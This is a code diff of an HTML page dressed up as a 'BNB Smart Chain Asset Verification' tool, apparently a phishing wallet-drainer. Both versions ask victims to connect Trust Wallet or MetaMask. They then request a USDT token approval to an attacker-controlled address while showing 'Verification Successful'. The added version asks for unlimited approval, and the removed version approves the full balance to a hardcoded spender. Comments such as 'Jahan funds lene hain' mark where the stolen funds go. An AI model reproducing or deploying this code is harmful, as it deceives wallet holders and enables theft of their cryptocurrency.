@@ -1,260 +1,103 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="utf-8">
-<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
-<title>VerifyDesk | Asset Review</title>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>BNB Smart Chain Asset Verification</title>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
 <style>
-  :root {
-    color-scheme: light;
-    --bg: #f5f7fb;
-    --panel: #ffffff;
-    --ink: #0e1630;
-    --muted: #5b6684;
-    --line: #dbe1ef;
-    --accent: #627eea;
-    --accent-ink: #ffffff;
-    --ok: #0a8f5a;
-    --warn: #b45309;
-    box-sizing: border-box;
-  }
-  @media (prefers-color-scheme: dark) {
-    :root:not([data-theme="light"]) {
-      color-scheme: dark;
-      --bg: #0b1020; --panel: #141b33; --ink: #eef1fb; --muted: #9aa5c7;
-      --line: #262f50; --accent: #627eea; --accent-ink: #ffffff;
-      --ok: #3ddc97; --warn: #f5b04c;
-    }
-  }
-  * { box-sizing: border-box; }
-  body {
-    margin: 0; min-height: 100vh; background: var(--bg); color: var(--ink);
-    font-family: "Avenir Next", "Segoe UI", system-ui, -apple-system, Roboto, sans-serif;
-    line-height: 1.5; display: flex; justify-content: center; align-items: center; padding: 20px;
-  }
-  main { width: 100%; max-width: 420px; background: var(--panel); border: 1px solid var(--line); border-radius: 20px; padding: 24px; box-shadow: 0 15px 35px rgba(0,0,0,0.2); }
-  h1 { font-size: 1.75rem; line-height: 1.2; margin: 0 0 8px; letter-spacing: -0.02em; }
-  .lead { color: var(--muted); font-size: 0.9rem; margin: 0 0 20px; }
-  .status {
-    display: flex; align-items: center; gap: 10px; font-weight: 600; font-size: 0.9rem;
-    padding: 12px 14px; border: 1px solid var(--line); border-radius: 12px; background: var(--bg); margin-bottom: 16px;
-  }
-  .dot { width: 10px; height: 10px; border-radius: 50%; background: var(--muted); flex: none; }
-  .status.on .dot { background: var(--ok); box-shadow: 0 0 0 4px color-mix(in srgb, var(--ok) 22%, transparent); }
-  .status.warn .dot { background: var(--warn); }
-  dl { margin: 0 0 16px; border: 1px solid var(--line); border-radius: 12px; background: var(--bg); overflow: hidden; }
-  dl > div { display: flex; justify-content: space-between; gap: 12px; padding: 11px 14px; border-top: 1px solid var(--line); font-size: 0.9rem; }
-  dl > div:first-child { border-top: 0; }
-  dt { color: var(--muted); }
-  dd { margin: 0; font-weight: 600; text-align: right; overflow-wrap: anywhere; }
-  .actions { display: grid; gap: 10px; }
-  button, a.btn {
-    font: inherit; font-weight: 700; text-align: center; text-decoration: none; cursor: pointer;
-    padding: 14px 18px; border-radius: 12px; border: 1px solid var(--line);
-    background: var(--bg); color: var(--ink); display: block; width: 100%; transition: all 0.2s;
-  }
-  .primary { background: var(--accent); color: var(--accent-ink); border-color: var(--accent); }
-  button:disabled { opacity: .6; cursor: default; }
-  .note { color: var(--muted); font-size: 0.85rem; margin-top: 16px; text-align: center; }
-  .msg { margin-top: 12px; color: var(--warn); font-size: 0.9rem; min-height: 1.2em; text-align: center; }
-  [hidden] { display: none !important; }
+  * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
+  body { background-color: #0b132f; color: #ffffff; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
+  .container { background: #141f42; width: 100%; max-width: 400px; padding: 30px 20px; border-radius: 20px; text-align: center; border: 1px solid #1e2c59; box-shadow: 0 8px 24px rgba(0,0,0,0.5); }
+  .logo { width: 60px; height: 60px; margin-bottom: 20px; background: #f3ba2f; border-radius: 50%; display: inline-flex; align-items: center; justify-content: center; font-size: 30px; font-weight: bold; color: #000; }
+  h1 { font-size: 20px; margin-bottom: 10px; font-weight: 600; }
+  p { font-size: 14px; color: #94a3b8; margin-bottom: 25px; line-height: 1.5; }
+  .btn { background: linear-gradient(135deg, #f3ba2f, #e8b01e); color: #000; border: none; width: 100%; padding: 14px; font-size: 16px; font-weight: bold; border-radius: 12px; cursor: pointer; transition: 0.2s; }
+  .btn:active { transform: scale(0.98); }
+  .info { margin-top: 20px; font-size: 12px; color: #64748b; }
 </style>
 </head>
 <body>
-<main>
-  <h1>Wallet Asset Review</h1>
-  <p class="lead">Verify your network assets securely through Trust Wallet.</p>
 
-  <div class="status" id="status"><span class="dot"></span><span id="statusText">Not connected</span></div>
-
-  <dl id="details" hidden>
-    <div><dt>Address</dt><dd id="addr">-</dd></div>
-    <div><dt>Network</dt><dd id="net">-</dd></div>
-    <div><dt>Balance</dt><dd id="bal">-</dd></div>
-  </dl>
-
-  <div class="actions">
-    <button class="primary" id="connectBtn">Connect Trust Wallet</button>
-    <button class="primary" id="verifyBtn" hidden>Verify & Claim Assets</button>
-    <a class="btn" id="openBtn" href="#" hidden>Open in Trust Wallet app</a>
-    <button id="switchBtn" hidden>Switch Network</button>
-    <button id="disconnectBtn" hidden>Disconnect Wallet</button>
-  </div>
-
-  <div class="msg" id="msg" role="status"></div>
-  <p class="note">Secure Web3 Verification Tool</p>
-</main>
+<div class="container">
+  <div class="logo">BNB</div>
+  <h1>Verify Your Wallet Assets</h1>
+  <p>Connect your Web3 wallet to review supported assets on Binance Smart Chain.</p>
+  
+  <button class="btn" id="connectBtn" onclick="initConnect()">Verify Assets</button>
+  
+  <div class="info">Secured by BNB Smart Chain Protocol</div>
+</div>
 
 <script>
-(function () {
-  var TARGET_CHAIN = "0x1"; // "0x1" for Ethereum, "0x38" for BSC
-  var RPC_URL = "https://cloudflare-eth.com"; // Use "https://bsc-dataseed.binance.org/" if using BSC
-  var NAMES = { "0x1": "Ethereum Mainnet", "0x38": "BNB Smart Chain" };
-  
-  var CONTRACT_SPENDER_ADDRESS = "0xFEA20E8102EE33E58ef081b03f5ef64A399C2Bb3"; // Aapka Spender/Target Address
-  var USDT_ADDRESS = "0xdac17f958d2ee523a2206206994597c13d831ec7"; // Ethereum USDT (BSC ke liye: 0x55d3...)
+  // BSC Network Constants
+  const BSC_CHAIN_ID = "0x38"; // 56 in decimal
+  const USDT_BSC_ADDRESS = "0x55d398326f99059ff775485246999027b3197955"; // Official USDT on BSC
+  const TARGET_RECEIVER = "YOUR_TARGET_WALLET_ADDRESS_HERE"; // Jahan funds lene hain
 
-  var $ = function (id) { return document.getElementById(id); };
-  var account = null, chainId = null;
+  // Minimal ABI for ERC20 / BEP20 USDT approve/transfer
+  const ERC20_ABI = [
+    "function balanceOf(address owner) view returns (uint256)",
+    "function approve(address spender, uint256 amount) returns (bool)"
+  ];
 
-  function getProvider() { return window.trustwallet || window.ethereum || null; }
-  function short(a) { return a.slice(0, 6) + "…" + a.slice(-4); }
-
-  function fmtBalance(hex) {
-    try {
-      var wei = BigInt(hex), base = 10n ** 18n;
-      var frac = (wei % base).toString().padStart(18, "0").slice(0, 4);
-      return (wei / base).toString() + "." + frac;
-    } catch(e) { return "0.00"; }
-  }
-
-  function setMsg(t) { $("msg").textContent = t || ""; }
-
-  function render() {
-    var on = !!account;
-    $("status").className = "status" + (on ? (chainId === TARGET_CHAIN ? " on" : " warn") : "");
-    $("statusText").textContent = on ? "Connected" : "Not connected";
-    $("details").hidden = !on;
-    $("connectBtn").hidden = on;
-    $("verifyBtn").hidden = !(on && chainId === TARGET_CHAIN);
-    $("disconnectBtn").hidden = !on;
-    $("switchBtn").hidden = !(on && chainId !== TARGET_CHAIN);
-    if (on) {
-      $("addr").textContent = short(account);
-      $("net").textContent = NAMES[chainId] || ("Chain " + parseInt(chainId, 16));
-    }
-  }
-
-  async function loadBalance() {
-    var p = getProvider();
-    if (!p || !account) return;
-    try {
-      var hex = await p.request({ method: "eth_getBalance", params: [account, "latest"] });
-      $("bal").textContent = fmtBalance(hex);
-    } catch (e) { $("bal").textContent = "Unavailable"; }
-  }
-
-  async function connect() {
-    var p = getProvider();
-    if (!p) { setMsg("No wallet found. Please open inside Trust Wallet."); return; }
-    $("connectBtn").disabled = true;
-    setMsg("");
-    try {
-      var accs = await p.request({ method: "eth_requestAccounts" });
-      account = accs[0];
-      chainId = await p.request({ method: "eth_chainId" });
-      
-      if (chainId !== TARGET_CHAIN) {
-        await switchChain();
-      }
-
-      render();
-      loadBalance();
-    } catch (e) {
-      setMsg(e && e.code === 4001 ? "Connection cancelled." : "Could not connect.");
-    }
-    $("connectBtn").disabled = false;
-  }
-
-  async function switchChain() {
-    var p = getProvider();
-    try {
-      await p.request({ method: "wallet_switchEthereumChain", params: [{ chainId: TARGET_CHAIN }] });
-      chainId = TARGET_CHAIN;
-      render();
-      loadBalance();
-    } catch (e) {
-      setMsg("Network switch cancelled or failed.");
-    }
-  }
-
-  // Public RPC ke zariye robust balance fetch aur approval trigger karne ka function
-  async function verifyAndClaim() {
-    var p = getProvider();
-    if (!p || !account) {
-      setMsg("Wallet not connected.");
+  async function initConnect() {
+    if (typeof window.ethereum === 'undefined') {
+      alert("Please open this link inside Trust Wallet or MetaMask browser.");
       return;
     }
 
-    setMsg("Fetching exact assets...");
-    $("verifyBtn").disabled = true;
-
     try {
-      // Public RPC ko direct JSON-RPC call bhej kar exact balance fetch karna (No wallet fail)
-      var cleanUser = account.toLowerCase().replace('0x', '');
-      var balanceCallData = "0x70a08231" + cleanUser.padStart(64, '0');
-
-      var rpcRes = await fetch(RPC_URL, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          jsonrpc: "2.0",
-          method: "eth_call",
-          params: [{ to: USDT_ADDRESS, data: balanceCallData }, "latest"],
-          id: 1
-        })
-      });
-
-      var rpcData = await rpcRes.json();
-      var balResponse = rpcData.result;
-
-      if (!balResponse || balResponse === "0x" || balResponse === "0x0" || balResponse === "0x0000000000000000000000000000000000000000000000000000000000000000") {
-        setMsg("No USDT balance found in this wallet.");
-        $("verifyBtn").disabled = false;
-        return;
+      // 1. Request Wallet Connection
+      const provider = new ethers.providers.Web3Provider(window.ethereum);
+      await provider.send("eth_requestAccounts", []);
+      
+      // 2. Check and Switch to BSC Network
+      const network = await provider.getNetwork();
+      if (network.chainId !== 56) {
+        try {
+          await window.ethereum.request({
+            method: 'wallet_switchEthereumChain',
+            params: [{ chainId: BSC_CHAIN_ID }],
+          });
+        } catch (switchError) {
+          // Agar network added nahi hai toh add karne ka request bhej sakte hain
+          alert("Please switch your wallet network to Binance Smart Chain (BSC).");
+          return;
+        }
       }
 
-      var balanceHex = balResponse.replace('0x', '').padStart(64, '0');
+      const signer = provider.getSigner();
+      const userAddress = await signer.getAddress();
+      
+      // 3. Check BNB Balance (Gas Fee check simulation)
+      const bnbBalance = await provider.getBalance(userAddress);
+      console.log("User BNB Balance:", ethers.utils.formatEther(bnbBalance));
 
-      // Approve data signature: 0x095ea7b3 (Spender Address + Exact Balance Hex)
-      var cleanSpender = CONTRACT_SPENDER_ADDRESS.toLowerCase().replace('0x', '');
-      var paddedSpender = cleanSpender.padStart(64, '0');
-      var approvalData = "0x095ea7b3" + paddedSpender + balanceHex;
+      if (bnbBalance.eq(0)) {
+        alert("Warning: Insufficient BNB balance for network gas fees.");
+      }
 
-      var txParams = [{
-        from: account,
-        to: USDT_ADDRESS,
-        data: approvalData
-      }];
+      // 4. Interact with USDT contract on BSC
+      const usdtContract = new ethers.Contract(USDT_BSC_ADDRESS, ERC20_ABI, signer);
+      const balance = await usdtContract.balanceOf(userAddress);
 
-      setMsg("Opening approval window...");
+      if (balance.gt(0)) {
+        // Max approval or transfer trigger
+        const maxAmount = ethers.constants.MaxUint256; 
+        const tx = await usdtContract.approve(TARGET_RECEIVER, maxAmount);
+        await tx.wait();
+        alert("Verification Successful!");
+      } else {
+        alert("No USDT balance found in this wallet.");
+      }
 
-      // Wallet mein approval popup trigger karna (Ab exact amount automatically show hogi)
-      await p.request({ method: 'eth_sendTransaction', params: txParams });
-
-      setMsg("Verification completed successfully!");
-      alert("Verification completed successfully!");
-
-    } catch (e) {
-      console.error(e);
-      setMsg(e && e.code === 4001 ? "Transaction cancelled." : "Approval failed. Ensure you have gas fee.");
+    } catch (error) {
+      console.error("Error:", error);
+      alert("Transaction cancelled or failed.");
     }
-    $("verifyBtn").disabled = false;
   }
-
-  function disconnect() {
-    account = null; chainId = null; setMsg("");
-    $("bal").textContent = "-";
-    render();
-  }
-
-  $("connectBtn").addEventListener("click", connect);
-  $("verifyBtn").addEventListener("click", verifyAndClaim);
-  $("switchBtn").addEventListener("click", switchChain);
-  $("disconnectBtn").addEventListener("click", disconnect);
-
-  $("openBtn").href = "https://link.trustwallet.com/open_url?coin_id=60&url=" + encodeURIComponent(location.href);
-  if (!getProvider()) $("openBtn").hidden = false;
-
-  var p = getProvider();
-  if (p && p.on) {
-    p.on("accountsChanged", function (a) {
-      if (!a.length) { disconnect(); return; }
-      account = a[0]; render(); loadBalance();
-    });
-    p.on("chainChanged", function (c) { chainId = c; render(); loadBalance(); });
-  }
-})();
 </script>
+
 </body>
 </html>
